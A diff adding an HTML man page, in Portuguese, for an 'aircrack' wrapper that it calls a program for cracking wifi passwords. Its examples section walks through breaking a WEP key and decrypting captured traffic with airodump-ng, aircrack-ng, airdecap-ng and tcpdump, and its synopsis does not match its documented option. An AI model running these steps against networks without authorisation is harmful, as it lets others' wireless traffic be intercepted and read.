@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv='content-type' value='text/html;charset=utf8'>
+  <meta name='generator' value='Ronn/v0.7.3 (http://github.com/rtomayko/ronn/tree/0.7.3)'>
+  <title>aircrack(1) - Programa para quebrar senha de rede wifi</title>
+  <style type='text/css' media='all'>
+  /* style: man */
+  body#manpage {margin:0}
+  .mp {max-width:100ex;padding:0 9ex 1ex 4ex}
+  .mp p,.mp pre,.mp ul,.mp ol,.mp dl {margin:0 0 20px 0}
+  .mp h2 {margin:10px 0 0 0}
+  .mp > p,.mp > pre,.mp > ul,.mp > ol,.mp > dl {margin-left:8ex}
+  .mp h3 {margin:0 0 0 4ex}
+  .mp dt {margin:0;clear:left}
+  .mp dt.flush {float:left;width:8ex}
+  .mp dd {margin:0 0 0 9ex}
+  .mp h1,.mp h2,.mp h3,.mp h4 {clear:left}
+  .mp pre {margin-bottom:20px}
+  .mp pre+h2,.mp pre+h3 {margin-top:22px}
+  .mp h2+pre,.mp h3+pre {margin-top:5px}
+  .mp img {display:block;margin:auto}
+  .mp h1.man-title {display:none}
+  .mp,.mp code,.mp pre,.mp tt,.mp kbd,.mp samp,.mp h3,.mp h4 {font-family:monospace;font-size:14px;line-height:1.42857142857143}
+  .mp h2 {font-size:16px;line-height:1.25}
+  .mp h1 {font-size:20px;line-height:2}
+  .mp {text-align:justify;background:#fff}
+  .mp,.mp code,.mp pre,.mp pre code,.mp tt,.mp kbd,.mp samp {color:#131211}
+  .mp h1,.mp h2,.mp h3,.mp h4 {color:#030201}
+  .mp u {text-decoration:underline}
+  .mp code,.mp strong,.mp b {font-weight:bold;color:#131211}
+  .mp em,.mp var {font-style:italic;color:#232221;text-decoration:none}
+  .mp a,.mp a:link,.mp a:hover,.mp a code,.mp a pre,.mp a tt,.mp a kbd,.mp a samp {color:#0000ff}
+  .mp b.man-ref {font-weight:normal;color:#434241}
+  .mp pre {padding:0 4ex}
+  .mp pre code {font-weight:normal;color:#434241}
+  .mp h2+pre,h3+pre {padding-left:0}
+  ol.man-decor,ol.man-decor li {margin:3px 0 10px 0;padding:0;float:left;width:33%;list-style-type:none;text-transform:uppercase;color:#999;letter-spacing:1px}
+  ol.man-decor {width:100%}
+  ol.man-decor li.tl {text-align:left}
+  ol.man-decor li.tc {text-align:center;letter-spacing:4px}
+  ol.man-decor li.tr {text-align:right;float:right}
+  </style>
+</head>
+<!--
+  The following styles are deprecated and will be removed at some point:
+  div#man, div#man ol.man, div#man ol.head, div#man ol.man.
+
+  The .man-page, .man-decor, .man-head, .man-foot, .man-title, and
+  .man-navigation should be used instead.
+-->
+<body id='manpage'>
+  <div class='mp' id='man'>
+
+  <div class='man-navigation' style='display:none'>
+    <a href="#NAME">NAME</a>
+    <a href="#SYNOPSIS">SYNOPSIS</a>
+    <a href="#DESCRI-O">DESCRIÇÃO</a>
+    <a href="#OP-ES">OPÇÕES</a>
+    <a href="#EXEMPLOS">EXEMPLOS</a>
+    <a href="#ARQUIVOS">ARQUIVOS</a>
+    <a href="#ENVIRONMENT">ENVIRONMENT</a>
+    <a href="#AUTOR">AUTOR</a>
+    <a href="#VEJA-SOBRE">VEJA SOBRE</a>
+  </div>
+
+  <ol class='man-decor man-head man head'>
+    <li class='tl'>aircrack(1)</li>
+    <li class='tc'></li>
+    <li class='tr'>aircrack(1)</li>
+  </ol>
+
+  <h2 id="NAME">NAME</h2>
+<p class="man-name">
+  <code>aircrack</code> - <span class="man-whatis">Programa para quebrar senha de rede wifi</span>
+</p>
+
+<h2 id="SYNOPSIS">SYNOPSIS</h2>
+
+<p><code>aircrack</code> [<code>-bar</code>] [<code>-c</code> <em>config-file</em> ] <em>file</em> ...</p>
+
+<h2 id="DESCRI-O">DESCRIÇÃO</h2>
+
+<p><code>aircrack</code>é um programa utilizado na maioria das vezes por <em>hacker</em> para quebrar a senha de redes wifi.</p>
+
+<h2 id="OP-ES">OPÇÕES</h2>
+
+<dl>
+<dt><code>-w</code> FILENAME</dt><dd>Usar uma wordlist FILENAME.</dd>
+</dl>
+
+
+<h2 id="EXEMPLOS">EXEMPLOS</h2>
+
+<p>root@crack_WEP:~# airodump-ng mon0
+[ CH 10 ][ Elapsed: 4 s ][ 2009-08-08 18:01 ][]
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+ 00:A0:C5:FF:84:72  197        4        0    0   1  11  WEP  WEP         private
+ BSSID              STATION            PWR   Rate  Lost  Packets  Probes</p>
+
+<p>root@crack_WEP:~# airodump-ng --channel 1 --bssid 00:A0:C5:FF:84:72 --write temp wlan0</p>
+
+<p> CH  1 ][ Elapsed: 31 mins ][ 2009-05-02 21:52                                       <br />
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+ 00:A0:C5:FF:84:72  205  10     6058    24496    0   1  54  WEP  WEP         private         <br />
+ BSSID              STATION            PWR   Rate  Lost  Packets  Probes                     <br />
+ 00:A0:C5:FF:84:72  00:18:4D:76:30:EB  188  54-54     0    24795</p>
+
+<p>root@crack_WEP:~# aircrack-ng -z -b 00:A0:C5:FF:84:72 temp.cap-0*.cap</p>
+
+<pre><code>                                     Aircrack-ng 1.0 rc1
+
+                     [00:00:22] Tested 240228 keys (got 41742 IVs)
+</code></pre>
+
+<p>   KB    depth   byte(vote)
+    0    0/  1   <span class="man-ref">B9<span class="s">(58880)</span></span> <span class="man-ref">A0<span class="s">(50688)</span></span> <span class="man-ref">12<span class="s">(50176)</span></span> <span class="man-ref">F5<span class="s">(49920)</span></span> <span class="man-ref">9E<span class="s">(48896)</span></span> <span class="man-ref">CD<span class="s">(48640)</span></span>
+    1    0/  1   <span class="man-ref">19<span class="s">(54784)</span></span> <span class="man-ref">E8<span class="s">(52480)</span></span> <span class="man-ref">FA<span class="s">(52480)</span></span> <span class="man-ref">4B<span class="s">(51456)</span></span> <span class="man-ref">79<span class="s">(51456)</span></span> <span class="man-ref">DD<span class="s">(49664)</span></span>
+    2    0/  1   <span class="man-ref">31<span class="s">(59648)</span></span> <span class="man-ref">EA<span class="s">(53504)</span></span> <span class="man-ref">40<span class="s">(50688)</span></span> <span class="man-ref">0A<span class="s">(50432)</span></span> <span class="man-ref">88<span class="s">(50432)</span></span> <span class="man-ref">0E<span class="s">(50176)</span></span>
+    3    0/  1   <span class="man-ref">8C<span class="s">(60416)</span></span> <span class="man-ref">05<span class="s">(49152)</span></span> <span class="man-ref">56<span class="s">(49152)</span></span> <span class="man-ref">23<span class="s">(48640)</span></span> <span class="man-ref">52<span class="s">(48384)</span></span> <span class="man-ref">03<span class="s">(48128)</span></span>
+    4    0/  1   <span class="man-ref">B2<span class="s">(59136)</span></span> <span class="man-ref">AE<span class="s">(49664)</span></span> <span class="man-ref">78<span class="s">(49152)</span></span> <span class="man-ref">FE<span class="s">(49152)</span></span> <span class="man-ref">8B<span class="s">(48384)</span></span> <span class="man-ref">9C<span class="s">(47616)</span></span>
+    5    0/  1   <span class="man-ref">61<span class="s">(53504)</span></span> <span class="man-ref">E6<span class="s">(50688)</span></span> <span class="man-ref">FF<span class="s">(50176)</span></span> <span class="man-ref">13<span class="s">(49664)</span></span> <span class="man-ref">23<span class="s">(49408)</span></span> <span class="man-ref">C7<span class="s">(49408)</span></span>
+    6    0/  1   <span class="man-ref">DD<span class="s">(56320)</span></span> <span class="man-ref">C4<span class="s">(51968)</span></span> <span class="man-ref">90<span class="s">(50688)</span></span> <span class="man-ref">0C<span class="s">(50176)</span></span> <span class="man-ref">CF<span class="s">(49920)</span></span> <span class="man-ref">CE<span class="s">(49152)</span></span>
+    7    0/  1   <span class="man-ref">4E<span class="s">(53248)</span></span> <span class="man-ref">E6<span class="s">(51968)</span></span> <span class="man-ref">7D<span class="s">(49152)</span></span> <span class="man-ref">0B<span class="s">(48896)</span></span> <span class="man-ref">90<span class="s">(48896)</span></span> <span class="man-ref">06<span class="s">(48640)</span></span>
+    8    0/  1   <span class="man-ref">FB<span class="s">(52224)</span></span> <span class="man-ref">C1<span class="s">(49664)</span></span> <span class="man-ref">E9<span class="s">(48128)</span></span> <span class="man-ref">3D<span class="s">(47616)</span></span> <span class="man-ref">F0<span class="s">(47360)</span></span> <span class="man-ref">EB<span class="s">(47104)</span></span>
+    9    0/  1   <span class="man-ref">0B<span class="s">(54784)</span></span> <span class="man-ref">BC<span class="s">(51712)</span></span> <span class="man-ref">52<span class="s">(50432)</span></span> <span class="man-ref">54<span class="s">(49920)</span></span> <span class="man-ref">F5<span class="s">(49920)</span></span> <span class="man-ref">CA<span class="s">(48896)</span></span>
+   10    0/  1   <span class="man-ref">E6<span class="s">(50944)</span></span> <span class="man-ref">1C<span class="s">(49920)</span></span> <span class="man-ref">5F<span class="s">(49408)</span></span> <span class="man-ref">1F<span class="s">(49152)</span></span> <span class="man-ref">0A<span class="s">(48896)</span></span> <span class="man-ref">83<span class="s">(48896)</span></span>
+   11    2/  1   <span class="man-ref">FF<span class="s">(49664)</span></span> <span class="man-ref">17<span class="s">(48384)</span></span> <span class="man-ref">94<span class="s">(48128)</span></span> <span class="man-ref">27<span class="s">(47872)</span></span> <span class="man-ref">23<span class="s">(47616)</span></span> <span class="man-ref">B2<span class="s">(47616)</span></span>
+   12    0/  4   <span class="man-ref">91<span class="s">(50452)</span></span> <span class="man-ref">A4<span class="s">(50360)</span></span> <span class="man-ref">77<span class="s">(50156)</span></span> <span class="man-ref">78<span class="s">(49540)</span></span> <span class="man-ref">FF<span class="s">(49476)</span></span> <span class="man-ref">70<span class="s">(48788)</span></span></p>
+
+<pre><code>         KEY FOUND! [ B9:19:31:8C:B2:61:DD:4E:FB:0B:AA:62:99 ] 
+Decrypted correctly: 100%
+</code></pre>
+
+<p><code>Decrypt the traffic</code>
+It is possible to capture the traffic in .cap files as above, decrypt it in a second file before sending it to the tcpdump command for instance:</p>
+
+<p>root@crack_WEP:~# airdecap-ng -w b919318cb261dd4efb0baa6299 temp-01.cap
+Total number of packets read         22072
+Total number of WEP data packets      6245
+Total number of WPA data packets         0
+`Number of plaintext data packets         3
+Number of decrypted WEP  packets      6245
+Number of corrupted WEP  packets         0
+Number of decrypted WPA  packets         0</p>
+
+<p>root@crack_WEP:~# tcpdump -r temp-01-dec.cap -i wlan</p>
+
+<h2 id="ARQUIVOS">ARQUIVOS</h2>
+
+<p> Use uma wordlist para ajudar a achar a chave.</p>
+
+<h2 id="ENVIRONMENT">ENVIRONMENT</h2>
+
+<p>O cdshell prove uma ferramenta chamada generator_wordlist.py que pode ser usada para gerar uma wordlist do jeito que você desejar.</p>
+
+<h2 id="AUTOR">AUTOR</h2>
+
+<p>Rafael Quirino - <var>quirinobytes (a) gmail com</var></p>
+
+<h2 id="VEJA-SOBRE">VEJA SOBRE</h2>
+
+<p><span class="man-ref">ronn<span class="s">(5)</span></span>, <span class="man-ref">markdown<span class="s">(1)</span></span>, <span class="man-ref">txt2tags<span class="s">(1)</span></span> <a href="http://www.schweikhardt.net/man_page_howto.html">Linux Man Page Howto</a></p>
+
+
+  <ol class='man-decor man-foot man foot'>
+    <li class='tl'></li>
+    <li class='tc'>May 2017</li>
+    <li class='tr'>aircrack(1)</li>
+  </ol>
+
+  </div>
+</body>
+</html>
